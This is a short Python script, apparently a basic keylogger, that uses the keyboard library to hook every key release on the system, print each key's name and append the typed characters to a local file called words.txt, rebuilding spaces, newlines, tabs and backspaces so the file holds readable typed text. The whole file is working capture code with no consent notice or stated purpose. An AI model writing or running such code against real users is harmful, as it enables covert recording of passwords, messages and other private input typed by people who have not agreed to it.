import keyboard
import os

def new_event(event : keyboard.KeyboardEvent) -> None :
    print(f"The key is - {event.name}")

    if os.path.exists("words.txt") and event.name == "backspace":
        with open("words.txt", "r") as file:
            content = file.read()[:-1] 
        with open("words.txt", "w") as file:
            file.write(content)
    else:
        with open("words.txt", "a") as file:
            if event.name == "space":
                file.write(" ")
            elif event.name == "enter":
                file.write("\n")
            elif event.name == "tab":
                file.write("\t")
            else:
                file.write(f"{event.name}" )



keyboard.on_release(callback=new_event)
keyboard.wait()